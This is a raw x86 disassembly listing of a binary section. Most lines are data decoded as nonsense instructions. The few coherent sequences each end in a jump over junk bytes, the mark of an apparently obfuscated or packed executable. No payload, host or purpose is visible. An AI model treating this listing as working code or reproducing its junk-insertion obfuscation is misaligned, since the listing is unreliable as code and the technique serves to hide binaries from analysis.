  41fb85:	sbb    DWORD PTR [esi+0x43cff0e0],0x22fcd822
  41fb8f:	add    ch,BYTE PTR [esi+0x365ddbba]
  41fb95:	mov    ch,BYTE PTR [ebx+edi*2]
  41fb98:	jg     0x41fbfb
  41fb9a:	xor    ebx,DWORD PTR [eax-0xc726a11]
  41fba0:	rol    BYTE PTR [edi+0x40],0xd1
  41fba4:	repnz pop es
  41fba6:	cmp    eax,0xd00ba1d0
  41fbab:	int    0x12
  41fbad:	jge    0x41fb51
  41fbaf:	xor    ebx,esi
  41fbb1:	xor    eax,0xc23feea8
  41fbb6:	and    eax,0x351bf311
  41fbbb:	std    
  41fbbc:	sub    DWORD PTR [ecx-0x13],ebp
  41fbbf:	and    DWORD PTR [edx-0x894750f],esi
  41fbc5:	(bad)  
  41fbc6:	rcr    BYTE PTR [ecx-0x9],cl
  41fbc9:	stos   BYTE PTR es:[edi],al
  41fbca:	push   ss
  41fbcb:	xchg   edx,eax
  41fbcc:	(bad)  
  41fbcd:	sbb    al,0xf3
  41fbcf:	popf   
  41fbd0:	cdq    
  41fbd1:	jp     0x41fbe7
  41fbd3:	jno    0x41fbdb
  41fbd5:	mov    al,ds:0xb5a2d219
  41fbda:	lods   al,BYTE PTR ds:[esi]
  41fbdb:	ret    
  41fbdc:	ss jge 0x41fc0f
  41fbdf:	sub    BYTE PTR [edi+0x181f5d7e],ch
  41fbe5:	sbb    BYTE PTR [ebx-0x29],cl
  41fbe8:	imul   esi,DWORD PTR [ebx-0x2],0x992b76e3
  41fbef:	fs xchg edi,eax
  41fbf1:	dec    eax
  41fbf2:	out    dx,al
  41fbf3:	mov    ?,ecx
  41fbf5:	imul   esi,DWORD PTR [esi-0x15],0x5db6ce9
  41fbfc:	add    DWORD PTR [ecx-0x1c],edx
  41fbff:	push   edx
  41fc00:	mov    eax,DWORD PTR [ebp-0x30]
  41fc03:	mov    ecx,DWORD PTR [ebp-0x30]
  41fc06:	adc    DWORD PTR ds:0x42f530,0x26d4
  41fc10:	sub    ecx,ebx
  41fc12:	sub    eax,0x7511
  41fc17:	cmp    DWORD PTR ds:0x42f5a8,0x0
  41fc1e:	jb     0x41fd09
  41fc24:	neg    edx
  41fc26:	jmp    0x41fd09
  41fc2b:	push   0x3c46
  41fc30:	push   0x3b3f
  41fc35:	call   DWORD PTR ds:0x4387a4
  41fc3b:	jmp    0x41fd09
  41fc40:	sub    DWORD PTR [ebx+0x48],edi
  41fc43:	adc    eax,0x7f7d375a
  41fc48:	jp     0x41fc4f
  41fc4a:	loope  0x41fc59
  41fc4c:	(bad)  
  41fc4d:	push   ds
  41fc4e:	scas   al,BYTE PTR es:[edi]
  41fc4f:	or     eax,0x17300
  41fc54:	mov    cl,0x0
  41fc56:	add    BYTE PTR [eax],al
  41fc58:	inc    edi
  41fc59:	xchg   ecx,eax
  41fc5a:	ins    DWORD PTR es:[edi],dx
  41fc5b:	(bad)  
  41fc5d:	stos   BYTE PTR es:[edi],al
  41fc5e:	in     al,dx
  41fc5f:	adc    bh,BYTE PTR [eax+0x1e3a7166]
  41fc65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc66:	sub    ecx,ecx
  41fc68:	int3   
  41fc69:	retf   0x490c
  41fc6c:	aam    0xa9
  41fc6e:	push   0xb
  41fc70:	push   es
  41fc71:	pop    es
  41fc72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc73:	push   ds
  41fc74:	outs   dx,DWORD PTR ds:[esi]
  41fc75:	cmc    
  41fc76:	cmp    ch,cl
  41fc78:	mov    WORD PTR [esi+0x62],ds
  41fc7b:	jmp    0x41fc86
  41fc7d:	adc    dh,bh
  41fc7f:	or     eax,0x79e4a479
  41fc84:	outs   dx,DWORD PTR ds:[esi]
  41fc85:	fimul  DWORD PTR [ebx-0x5e]
  41fc88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc89:	loope  0x41fc59
  41fc8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc8c:	cdq    
  41fc8d:	out    dx,eax
  41fc8e:	adc    DWORD PTR [ecx+0x6e],ecx
  41fc91:	sbb    al,0x20
  41fc93:	ret    0xa72d
  41fc96:	mov    al,0xc1
  41fc98:	dec    eax
  41fc99:	or     eax,0x6d75e4cf
  41fc9e:	stc    
  41fc9f:	(bad)  
  41fca0:	sub    eax,0xeee50f4
  41fca5:	enter  0xe6dc,0x12
  41fca9:	xchg   ecx,eax
  41fcaa:	test   al,0x65
  41fcac:	cwde   
  41fcad:	jnp    0x41fcbf
  41fcaf:	pop    ss
  41fcb0:	lea    ebx,[esi]
  41fcb2:	fwait
  41fcb3:	push   DWORD PTR [eax-0x16]
  41fcb6:	imul   ebx,edi,0xffffffed
  41fcb9:	or     esi,DWORD PTR ds:0x6d532f57
  41fcbf:	xor    ecx,DWORD PTR [edx+0x7c147aa2]
  41fcc5:	fistp  QWORD PTR [ecx+ebx*4]
  41fcc8:	iret   
  41fcc9:	pop    eax
  41fcca:	inc    edx
  41fccb:	data16 add al,0xc9
  41fcce:	cmp    al,0xbe
  41fcd0:	test   eax,0x5297125a
  41fcd5:	xor    eax,0x7c0f8c12
  41fcda:	ja     0x41fd4e
  41fcdc:	rcr    ebx,cl
  41fcde:	repz pop edi
  41fce0:	xchg   ecx,eax
  41fce1:	ret    0xbe2c
  41fce4:	push   ebp
  41fce5:	or     al,0xb
  41fce7:	mov    cl,0x17
  41fce9:	add    ebx,DWORD PTR [edi+0x5cc2c21c]
  41fcef:	push   esi
  41fcf0:	mov    ds:0xe313062e,al
  41fcf5:	scas   eax,DWORD PTR es:[edi]
  41fcf6:	pop    edi
  41fcf7:	add    dh,BYTE PTR [edi+0x558ec513]
  41fcfd:	in     eax,0xcd
  41fcff:	shl    DWORD PTR [ebx-0x29],cl
  41fd02:	add    dl,ch
  41fd04:	ss sbb al,0xe3
  41fd07:	ins    DWORD PTR es:[edi],dx
  41fd08:	cs xor ecx,0x78e20000
  41fd0f:	shr    ecx,0x10
  41fd12:	xor    eax,0x59c9
  41fd17:	jmp    0x41fde5
  41fd1c:	int    0x18
  41fd1e:	ret    0xd73a
  41fd21:	cli    
  41fd22:	std    
  41fd23:	(bad)  
  41fd24:	jmp    0xdf20571c
  41fd29:	xor    eax,0x73b17079
  41fd2e:	add    DWORD PTR [eax],eax
  41fd30:	mov    cl,0x0
  41fd32:	add    BYTE PTR [eax],al
  41fd34:	mov    edx,0xafa9d9ff
  41fd39:	dec    esi
  41fd3a:	xchg   edi,eax
  41fd3b:	stos   DWORD PTR es:[edi],eax
  41fd3c:	jmp    0xcf1a:0x777a7270
  41fd43:	xor    BYTE PTR [edi],bh
  41fd45:	mov    cl,0x4
  41fd47:	dec    esp
  41fd48:	mov    ecx,0x6e1602f0
  41fd4d:	mov    ah,0x67
  41fd4f:	sbb    al,0x3d
  41fd51:	scas   eax,DWORD PTR es:[edi]
  41fd52:	inc    edi
  41fd53:	or     eax,0xbff64d86
  41fd58:	mov    BYTE PTR [ebx],dl
  41fd5a:	ins    DWORD PTR es:[edi],dx
  41fd5b:	pinsrw mm1,WORD PTR [ecx-0x7f],0xe6
  41fd60:	mov    ds:0x82fddd31,eax
  41fd65:	xor    esp,DWORD PTR [ebx]
  41fd67:	sbb    dh,ch
  41fd69:	inc    edx
  41fd6a:	xor    BYTE PTR [esi-0x4db0177d],al
  41fd70:	sbb    eax,0x876ac0b4
  41fd75:	or     ebx,DWORD PTR [esi+edx*8]
  41fd78:	retf   0x5634
  41fd7b:	dec    ebp
  41fd7c:	lods   eax,DWORD PTR ds:[esi]
  41fd7d:	hlt    
  41fd7e:	cmp    al,0xf2
  41fd80:	push   ecx
  41fd81:	mov    cl,0xcd
  41fd83:	hlt    
  41fd84:	xchg   esi,eax
  41fd85:	aam    0x9e
  41fd87:	cs scas al,BYTE PTR es:[edi]
  41fd89:	shl    DWORD PTR [edx+esi*2],0x2f
  41fd8d:	imul   edi,DWORD PTR [ecx+0x14],0x373eb2bd
  41fd94:	mov    esi,0xfb3b53da
  41fd99:	or     ah,BYTE PTR [edi-0x15f9ec4e]
  41fd9f:	hlt    
  41fda0:	jae    0x41fd73
  41fda2:	cmp    DWORD PTR [ecx+0x2244d1f4],esi
  41fda8:	aas    
  41fda9:	pop    ebp
  41fdaa:	ds das 
  41fdac:	int3   
  41fdad:	inc    edx
  41fdae:	sub    eax,0x55f2d842
  41fdb3:	jge    0x41fe00
  41fdb5:	pop    ds
  41fdb6:	pop    edi
  41fdb7:	(bad)  
  41fdb9:	out    0x1d,al
  41fdbb:	jp     0x41fd9d
  41fdbd:	call   0x859f:0x1776e900
  41fdc4:	bound  esp,QWORD PTR [ebp+eiz*1-0x39320616]
  41fdcb:	add    DWORD PTR [ecx-0x2e],esp
  41fdce:	imul   esi,DWORD PTR [ecx-0x66172cf3],0x3e
  41fdd5:	mov    WORD PTR [ecx],gs
  41fdd7:	mov    bl,0x31
  41fdd9:	in     eax,0x91
  41fddb:	xor    BYTE PTR [ebp-0x12cf49ae],ah
  41fde1:	inc    ecx
  41fde2:	sbb    bx,WORD PTR [eax+0xb10e0c1]
  41fde9:	shr    ecx,0xc9
  41fdec:	add    BYTE PTR [eax],al
  41fdee:	add    BYTE PTR [ebx-0x51],bl
  41fdf1:	and    ebx,ecx
  41fdf3:	neg    ebp
  41fdf5:	sti    
  41fdf6:	scas   eax,DWORD PTR es:[edi]
  41fdf7:	mov    dh,0x81
  41fdf9:	push   0x70
  41fdfb:	cld    
  41fdfc:	cmp    esi,esp
  41fdfe:	xor    esp,DWORD PTR [edx+0x74]
  41fe01:	add    DWORD PTR [eax],eax
  41fe03:	mov    cl,0x0
  41fe05:	add    BYTE PTR [eax],al
  41fe07:	loope  0x41fe43
  41fe09:	dec    ecx
  41fe0a:	push   ecx
  41fe0b:	jecxz  0x41fde9
  41fe0d:	pop    es
  41fe0e:	popf   
  41fe0f:	cwde   
  41fe10:	mov    ds:0x8fa3ea21,al
  41fe15:	dec    ebp
  41fe16:	inc    esi
  41fe17:	addr16 in al,0xd8
  41fe1a:	outs   dx,BYTE PTR ds:[esi]
  41fe1b:	fstp   TBYTE PTR [ebx-0x1c7c21c9]
  41fe21:	call   0x9f05:0xafb2fef3
  41fe28:	addr16 pop ecx
  41fe2a:	sub    al,0xa8
  41fe2c:	mov    ah,0xd6
  41fe2e:	iret   
  41fe2f:	popa   
  41fe30:	jnp    0x41fea3
  41fe32:	int3   
  41fe33:	and    dl,BYTE PTR [esi-0x6e2da16d]
  41fe39:	cmp    ch,BYTE PTR [eax]
  41fe3b:	sub    ah,BYTE PTR [ecx+esi*2+0x457b48c9]
  41fe42:	xchg   edi,eax
  41fe43:	inc    edx
  41fe44:	pusha  
  41fe45:	xchg   edx,eax
  41fe46:	shr    DWORD PTR [eax-0x71a80c4f],1
  41fe4c:	aas    
  41fe4d:	js     0x41fe93
  41fe4f:	adc    ebp,DWORD PTR [ebp-0x60]
  41fe52:	cmp    al,0x9
  41fe54:	add    al,0xfb
  41fe56:	mov    BYTE PTR [eax+ebx*1],cl
  41fe59:	test   al,0x6c
  41fe5b:	lods   al,BYTE PTR ds:[esi]
  41fe5c:	mov    ds:0x20ccb927,eax
  41fe61:	cs sti 
  41fe63:	ins    DWORD PTR es:[edi],dx
  41fe64:	mov    al,0x93
  41fe66:	mov    al,0x32
  41fe68:	adc    BYTE PTR [esi-0x1ecf0b9b],ch
  41fe6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe6f:	imul   edi,DWORD PTR [ebx+0x616f57b7],0xffffffee
  41fe76:	clc    
  41fe77:	fndisi(8087 only) 
  41fe79:	mov    bh,0x9a
  41fe7b:	mov    ebx,0xeee4c7a8
  41fe80:	pusha  
  41fe81:	adc    eax,0x26a0349c
  41fe86:	into   
  41fe87:	sub    BYTE PTR [eax+edx*8+0x6f],bh
  41fe8b:	mov    dl,0x80
  41fe8d:	xor    ecx,ebx
  41fe8f:	sbb    dh,BYTE PTR ds:0x9af1157b
  41fe95:	out    dx,eax
  41fe96:	jns    0x41fecc
  41fe98:	loope  0x41fe60
  41fe9a:	sub    ebp,DWORD PTR [ebp+0x6f]
  41fe9d:	cmp    dl,bh
  41fe9f:	add    dh,BYTE PTR [eax-0x2a]
  41fea2:	adc    bh,BYTE PTR ds:0x647f5dc1
  41fea8:	xchg   ecx,eax
  41fea9:	cmp    eax,0x4e9d2168
  41feae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feaf:	inc    esi
  41feb0:	in     eax,0x18
  41feb2:	push   ss
  41feb3:	xchg   BYTE PTR [eax-0x19],bh
  41feb6:	daa    
  41feb7:	ins    DWORD PTR es:[edi],dx
  41feb8:	mov    ecx,DWORD PTR [ebp+0x10]
  41febb:	cmp    DWORD PTR ds:0x42f60c,0x0
  41fec2:	jl     0x41ffa6
  41fec8:	jmp    0x41ffa6
  41fecd:	push   0x81f7
  41fed2:	call   DWORD PTR ds:0x438800
  41fed8:	jmp    0x41ffa6
  41fedd:	repz pop esi
  41fedf:	pop    edi
  41fee0:	out    dx,eax
  41fee1:	(bad)  
  41fee2:	out    dx,eax
  41fee3:	repz pop esi
  41fee5:	out    dx,eax
  41fee6:	xchg   ebp,esi
  41fee8:	mov    edi,0xe432c42b
  41feed:	adc    esi,DWORD PTR [ebp+0x1]
  41fef0:	add    BYTE PTR [ecx-0x3e000000],dh
  41fef6:	pop    ss
  41fef7:	mov    ecx,0x875cd720
  41fefc:	stc    
  41fefd:	add    BYTE PTR [esi+0x50],cl
  41ff00:	xor    al,0xa0
  41ff02:	fs cmc 
  41ff04:	sbb    BYTE PTR [ebp-0x29947cde],dh
  41ff0a:	cmc    
  41ff0b:	in     eax,dx
  41ff0c:	popa   
  41ff0d:	lds    esi,FWORD PTR [ebx-0x74]
  41ff10:	mov    ebx,0xcfdb14ae
  41ff15:	push   ds
  41ff16:	adc    eax,0x81c40a0d
  41ff1b:	or     edi,DWORD PTR [ebx]
  41ff1d:	and    eax,0x802a12d1
  41ff22:	mov    dl,0xa4
  41ff24:	xchg   edi,eax
  41ff25:	and    DWORD PTR [edi],edx
  41ff27:	into   
  41ff28:	stos   BYTE PTR es:[edi],al
  41ff29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff2a:	fild   WORD PTR [edi-0x3f]
  41ff2d:	mov    ecx,0xfc6e9dc
  41ff32:	cmp    BYTE PTR [ecx-0x5aab3373],cl
  41ff38:	inc    ebp
  41ff39:	xor    eax,0x1e46dce7
  41ff3e:	neg    ah
  41ff40:	call   0x4325:0xbaafcade
  41ff47:	inc    esp
  41ff48:	mov    ch,0x10
  41ff4a:	push   ds
  41ff4b:	mov    ds:0x60ba992e,al
  41ff50:	inc    ebp
  41ff51:	sahf   
  41ff52:	addr16 enter 0x463,0xf1
  41ff57:	xor    BYTE PTR [edi-0x51],0x8e
  41ff5b:	or     DWORD PTR [ecx+esi*4+0x3d],edi
  41ff5f:	imul   ebx,DWORD PTR [ecx+0x57],0x7a
  41ff63:	retf   
  41ff64:	pop    ss
  41ff65:	int3   
  41ff66:	xchg   ebx,eax
  41ff67:	sub    edx,ebx
  41ff69:	das    
  41ff6a:	pop    esi
  41ff6b:	sbb    al,0x6f
  41ff6d:	cdq    
  41ff6e:	dec    edi
  41ff6f:	push   es
  41ff70:	aam    0xc3
  41ff72:	fldenv [ebx+0x1e]
  41ff75:	mov    ds:0xcc020eb,eax
  41ff7a:	cld    
  41ff7b:	mov    eax,0xbf0ce22b
  41ff80:	fwait
  41ff81:	add    edi,DWORD PTR [ecx+0x25]
  41ff84:	loop   0x41ffc1
  41ff86:	cmp    edi,edx
  41ff88:	call   0xeb104420
  41ff8d:	dec    edx
  41ff8e:	mov    ah,0x51
  41ff90:	(bad)  
  41ff91:	mov    cl,0x88
  41ff93:	stos   DWORD PTR es:[edi],eax
  41ff94:	imul   esp,DWORD PTR gs:[edx+0x1c],0x4
  41ff99:	mov    fs,WORD PTR [eax-0x3]
  41ff9c:	xor    bh,BYTE PTR [esi-0x4185a181]
  41ffa2:	jg     0x41ff27
  41ffa4:	mov    ds:0x14558b32,al
  41ffa9:	mov    edx,DWORD PTR [ebp+0x10]
  41ffac:	jmp    0x42007a
  41ffb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffb2:	ret    0xa57e
  41ffb5:	jle    0x41ff74
  41ffb7:	inc    ebx
  41ffb9:	dec    edi
  41ffba:	stos   BYTE PTR es:[edi],al
  41ffbb:	in     al,0x65
  41ffbd:	test   al,0xd9
  41ffbf:	push   eax
  41ffc0:	xchg   ebp,eax
  41ffc1:	les    esi,FWORD PTR [ebp+0x1]
  41ffc4:	add    BYTE PTR [ecx+0x11000000],dh
  41ffca:	repz into 
  41ffcc:	sub    eax,0x39d5cdbc
  41ffd1:	sahf   
  41ffd2:	test   DWORD PTR ds:0x8d6c1792,esp
  41ffd8:	xlat   BYTE PTR ds:[ebx]
  41ffd9:	jmp    0x9979:0x68aab036
  41ffe0:	sbb    edi,DWORD PTR [edi+0xe1f35c8]
  41ffe6:	sti    
  41ffe7:	outs   dx,BYTE PTR ds:[esi]
  41ffe9:	dec    esi
  41ffea:	adc    eax,0xbdb9dd43
  41ffef:	and    al,0x40
  41fff1:	mov    ah,BYTE PTR [esi]
  41fff3:	and    eax,0x5b9a7f97
  41fff8:	cs mov edi,0xefdfee7d
  41fffe:	jg     0x41ff85
  420000:	iret   
  420001:	xchg   DWORD PTR [eax+eiz*4],edx
  420004:	mov    esi,0xbee977ce
  42000a:	or     bl,cl
  42000c:	sbb    edx,0x2e
  42000f:	and    al,0x0
  420011:	or     BYTE PTR [eax],cl
  420013:	inc    esp
  420014:	adc    esi,DWORD PTR [eax-0x12b4f7bc]
  42001a:	or     edx,DWORD PTR [ebp+0x7aeb803b]
  420020:	das    
  420021:	jb     0x420045
  420023:	mov    ds:0x5f208540,eax
  420028:	pop    esp
  420029:	and    ebx,esi
  42002b:	cmp    al,ah
  42002d:	mov    esi,0x8b27f324
  420032:	jno    0x420042
  420034:	sub    edx,edx
  420036:	fs push edi
  420038:	inc    ebx
  420039:	call   0xf03205d3
  42003e:	fstp   TBYTE PTR [ecx+edx*1+0xa]
  420042:	add    edx,DWORD PTR [esi]
  420044:	test   DWORD PTR [esi+0x6f],edx
  420047:	add    BYTE PTR [eax+0x27bc7bff],al
  42004d:	pop    ecx
  42004e:	inc    ebx
  42004f:	jno    0x41fffb
  420051:	xchg   ecx,eax
  420052:	ins    DWORD PTR es:[edi],dx
  420053:	or     BYTE PTR [edi+ebx*4-0x3228500c],al
  42005a:	xor    bh,dh
  42005c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42005d:	(bad)  
  42005e:	je     0x4200b4
  420060:	(bad)  
  420061:	rcr    bl,0x3
  420064:	std    
  420065:	imul   ebx,edi,0x5f
  420068:	retf   
  420069:	inc    ebx
  42006a:	jmp    FWORD PTR [ebp+ecx*8-0xb1d073d]
  420071:	pop    es
  420072:	or     al,0xcd
  420074:	mov    ebp,0x9778f976
  420079:	js     0x4200ae
  42007b:	into   
  42007c:	sub    eax,ebx
  42007e:	mov    ebx,DWORD PTR [ebp+0x14]
  420081:	xor    edx,esi
  420083:	add    ecx,edx
  420085:	adc    DWORD PTR ds:0x42f664,edx
  42008b:	jmp    0x420159
  420090:	pop    esi
  420091:	icebp  
  420092:	dec    ebp
  420093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420094:	out    dx,eax
  420095:	mov    ebp,0x5a03fbfe
  42009a:	ror    BYTE PTR [esi+0x44],cl
  42009d:	mov    BYTE PTR [esi-0x33],cl
  4200a0:	jne    0x420118
  4200a2:	add    DWORD PTR [eax],eax
  4200a4:	mov    cl,0x0
  4200a6:	add    BYTE PTR [eax],al
  4200a8:	pop    edi
  4200a9:	xchg   ebx,eax
  4200aa:	pop    esi
  4200ab:	and    esp,DWORD PTR [edi+0x5e]
  4200ae:	out    dx,eax
  4200af:	(bad)  
  4200b0:	sbb    DWORD PTR [ebx],ebx
  4200b2:	popa   
  4200b3:	jbe    0x420038
  4200b5:	fild   QWORD PTR [edx]
  4200b7:	pusha  
  4200b8:	add    cl,dh
  4200ba:	clc    
  4200bb:	xchg   BYTE PTR [edi-0x37],bl
  4200be:	pusha  
  4200bf:	in     eax,dx
  4200c0:	adc    ebp,DWORD PTR [esi-0x1b]
  4200c3:	or     al,0x81
  4200c5:	stc    
  4200c6:	ja     0x420104
  4200c8:	fisub  WORD PTR [edx-0x3bc5cd3]
  4200ce:	scas   al,BYTE PTR es:[edi]
  4200cf:	outs   dx,BYTE PTR ds:[esi]
  4200d0:	out    0x17,eax
  4200d2:	in     eax,0x4e
  4200d4:	xlat   BYTE PTR ds:[ebx]
  4200d5:	lock aaa 
  4200d7:	jae    0x4200c6
  4200d9:	push   0xbeca2aaf
  4200de:	pop    ds
  4200df:	jae    0x420100
  4200e1:	or     ecx,DWORD PTR [ecx-0x18a48f47]
  4200e7:	push   ecx
  4200e8:	icebp  
  4200e9:	add    eax,0x6a3f6cf8
  4200ee:	pop    esp
  4200ef:	shr    BYTE PTR [esi+0x6d],1
  4200f2:	sbb    ecx,0xffffffbb
  4200f5:	vpsrlq xmm4,xmm1,xmm5
  4200f9:	retf   0x34ad
  4200fc:	xchg   ecx,eax
  4200fd:	sbb    BYTE PTR [edi],bh
  4200ff:	mov    eax,0x9bd4283d
  420104:	js     0x420141
  420106:	mov    esi,0xeafc70ba
  42010b:	dec    eax
  42010c:	and    al,0xdb
  42010e:	pop    eax
  42010f:	cli    
  420110:	push   edx
  420111:	int    0xea
  420113:	mov    cl,BYTE PTR [eax-0x1284b641]
  420119:	not    DWORD PTR [esi+eiz*1-0x2d517c9]
  420120:	mov    ah,0x90
  420122:	xchg   ebx,eax
  420123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420124:	loop   0x420164
  420126:	cmp    bh,0xd
  420129:	cli    
  42012a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42012b:	dec    edx
  42012c:	inc    ecx
  42012d:	mov    WORD PTR [edi-0x52],ds
  420130:	in     eax,dx
  420131:	xchg   esp,eax
  420132:	loope  0x4200d3
  420134:	and    ecx,esi
  420136:	ret    0xd66a
  420139:	jae    0x42018e
  42013b:	stos   BYTE PTR es:[edi],al
  42013c:	stos   DWORD PTR es:[edi],eax
  42013d:	xor    DWORD PTR ds:0x2eb8a367,edx
  420143:	or     ebx,DWORD PTR [ebx-0x57]
  420146:	mov    cs,WORD PTR [eax-0x20]
  420149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42014a:	out    dx,al
  42014b:	fiadd  DWORD PTR [ebp-0x237211b5]
  420151:	fisubr DWORD PTR [esi+0x107a6cbc]
  420157:	stos   BYTE PTR es:[edi],al
  420158:	cmp    ecx,DWORD PTR [ecx+0x11dc8d84]
  42015e:	ret    
  42015f:	int    0x83
  420161:	cmp    eax,0x42f640
  420166:	add    BYTE PTR [edi],cl
  420168:	sbb    BYTE PTR [eax+eax*1],0x0
  42016c:	add    BYTE PTR [ebx],dh
  42016e:	retf   
  42016f:	adc    edx,eax
  420171:	jmp    0x420189
  420176:	push   0x7f66
  42017b:	push   DWORD PTR [ebp-0x10]
  42017e:	push   0x804b
  420183:	call   DWORD PTR ds:0x43880c
  420189:	mov    eax,DWORD PTR [ebp+0x10]
  42018c:	mov    ecx,DWORD PTR [ebp+0x14]
  42018f:	mov    ecx,DWORD PTR [ebp+0x10]
  420192:	mov    edx,DWORD PTR [ebp+0x14]
  420195:	xor    ecx,esi
  420197:	jmp    0x420265
  42019c:	lahf   
  42019d:	dec    edi
  42019e:	sahf   
  42019f:	add    bl,dh
  4201a1:	rcr    DWORD PTR [edi+0x279e1ddf],cl
  4201a7:	fcompp 
  4201a9:	mov    ebx,0x7726e457
  4201ae:	add    DWORD PTR [eax],eax
  4201b0:	mov    cl,0x0
  4201b2:	add    BYTE PTR [eax],al
  4201b4:	mov    gs,WORD PTR [ebp-0x4c]
  4201b7:	or     al,0x99
  4201b9:	jo     0x420201
  4201bb:	mov    ebp,DWORD PTR [ebx+0x46]
  4201be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201bf:	mov    eax,ds:0x39fea754
  4201c4:	push   eax
  4201c5:	mov    bl,0x4b
  4201c7:	xchg   dh,dl
  4201c9:	inc    eax
  4201ca:	aas    
  4201cb:	inc    ebp
  4201cc:	mov    edi,0x499a3ace
  4201d1:	jp     0x420229
  4201d3:	addr16 repz inc esi
  4201d6:	push   eax
  4201d7:	ins    DWORD PTR es:[edi],dx
  4201d8:	mov    ds:0xf5494149,al
  4201dd:	jp     0x42025c
  4201df:	sub    eax,0x92747923
  4201e4:	adc    eax,0xd6aeea23
  4201e9:	fimul  WORD PTR [ebx]
  4201eb:	mov    esp,edi
  4201ed:	add    dh,0xd3
  4201f0:	(bad)  
  4201f1:	gs inc esp
  4201f3:	repz sti 
  4201f5:	outs   dx,BYTE PTR ds:[esi]
  4201f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201f7:	pop    esi
  4201f8:	popa   
  4201f9:	outs   dx,BYTE PTR ds:[esi]
  4201fa:	addr16 push 0x733956bb
  420200:	sti    
  420201:	(bad)  
  420203:	jl     0x42018a
  420205:	les    edi,FWORD PTR [edi-0x6c]
  420208:	in     al,0x1e
  42020a:	inc    eax
  42020b:	push   eax
  42020c:	shr    esp,1
  42020e:	je     0x4201b5
  420210:	adc    al,0xec
  420212:	push   ss
  420213:	(bad)  
  420214:	pusha  
  420215:	xor    dl,BYTE PTR [edx]
  420217:	push   ecx
  420218:	cli    
  420219:	push   edi
  42021a:	stos   BYTE PTR es:[edi],al
  42021b:	test   eax,0x5646f871
  420220:	mov    edi,DWORD PTR ds:0x222d926f
  420226:	adc    ebp,DWORD PTR [edx]
  420228:	xchg   edi,eax
  420229:	js     0x4201c6
  42022b:	cs ret 0x40a4
  42022f:	lods   eax,DWORD PTR ds:[esi]
  420230:	add    cl,bl
  420232:	mov    dl,0xc9
  420234:	fidiv  DWORD PTR [eax-0x6824a024]
  42023a:	cwde   
  42023b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42023c:	mov    ebx,0xd87a60cd
  420241:	dec    ebp
  420242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420243:	stos   DWORD PTR es:[edi],eax
  420244:	clc    
  420245:	mov    al,ds:0x26f315b6
  42024a:	push   edi
  42024b:	ss ds aad 0xda
  42024f:	in     al,0xa4
  420251:	imul   eax,DWORD PTR [ebp-0x584f8ad4],0xffffffd0
  420258:	adc    DWORD PTR [ebx-0x588307b7],ebp
  42025e:	mov    eax,ds:0xf67395de
  420263:	cmp    eax,0x3c6330e
  420268:	ror    DWORD PTR [ebx-0x3616efb3],0x0
  42026f:	add    BYTE PTR [eax],al
  420271:	retf   
  420272:	ror    edx,0xa
  420275:	retf   0xcb0b
  420278:	rcl    DWORD PTR [ebx],0x3c
  42027b:	aaa    
  42027c:	xchg   edx,eax
  42027d:	sbb    eax,0xd7e4464d
  420282:	ja     0x420285
  420284:	add    BYTE PTR [ecx-0x4f000000],dh
  42028a:	xor    al,0x1a
  42028c:	call   0x83cb7088
  420291:	dec    esp
  420292:	xchg   esp,eax
  420293:	sub    al,0xeb
  420295:	jns    0x420223
  420297:	or     BYTE PTR [edi],dl
  420299:	imul   eax,DWORD PTR [ecx-0x7062ea00],0xabff1a3b
  4202a3:	or     al,0x6a
  4202a5:	test   eax,0x361d21e7
  4202aa:	scas   eax,DWORD PTR es:[edi]
  4202ab:	inc    esp
  4202ac:	sbb    cl,bh
  4202ae:	mov    ah,0x3b
  4202b0:	sbb    ch,bl
  4202b2:	adc    eax,esp
  4202b4:	popa   
  4202b5:	or     al,0x6d
  4202b7:	jl     0x4202b3
  4202b9:	and    esp,eax
  4202bb:	scas   al,BYTE PTR es:[edi]
  4202bc:	xor    DWORD PTR ds:0x82872d8a,esi
  4202c2:	fstp   TBYTE PTR [ebp-0x16573f46]
  4202c8:	inc    ecx
  4202c9:	test   eax,0x70e86cbe
  4202ce:	sahf   
  4202cf:	or     BYTE PTR [ecx-0x71],0x66
  4202d3:	jl     0x4202e3
  4202d5:	mov    edi,0x17190ccd
  4202da:	ins    BYTE PTR es:[edi],dx
  4202db:	cli    
  4202dc:	mov    ebx,0xd7018bde
  4202e1:	jns    0x4202fb
  4202e3:	and    BYTE PTR ds:0x733bf8a4,al
  4202e9:	add    al,0x58
  4202eb:	push   ds
  4202ec:	jb     0x420342
  4202ee:	fsub   QWORD PTR [ebp-0x7d756616]
  4202f4:	add    ah,BYTE PTR [ebx-0x20fbc9d0]
  4202fa:	je     0x42034b
  4202fc:	mov    bl,0x4c
  4202fe:	sbb    al,0x52
  420300:	adc    al,0x71
  420302:	sub    al,0x18
  420304:	cwde   
  420305:	out    0x9,al
  420307:	jae    0x420303
  420309:	pushf  
  42030a:	cmp    DWORD PTR [ecx],esi
  42030c:	ror    WORD PTR [ebp*1+0x2cda0515],cl
  420314:	xor    eax,0xfee39bdf
  420319:	dec    esp
  42031a:	push   esi
  42031b:	daa    
  42031c:	test   eax,0x786ff8d4
  420321:	push   edx
  420322:	sub    al,0xb6
  420324:	push   es
  420325:	mov    al,ds:0xddc1a7d7
  42032a:	xchg   ebp,eax
  42032b:	pop    esi
  42032c:	and    DWORD PTR [edi],0x8faa39e
  420332:	ja     0x42039f
  420334:	les    eax,FWORD PTR [ebx+0x11]
  420337:	fnstcw WORD PTR [edx]
  420339:	and    BYTE PTR [ebx-0x16b4ebab],cl
  42033f:	leave  
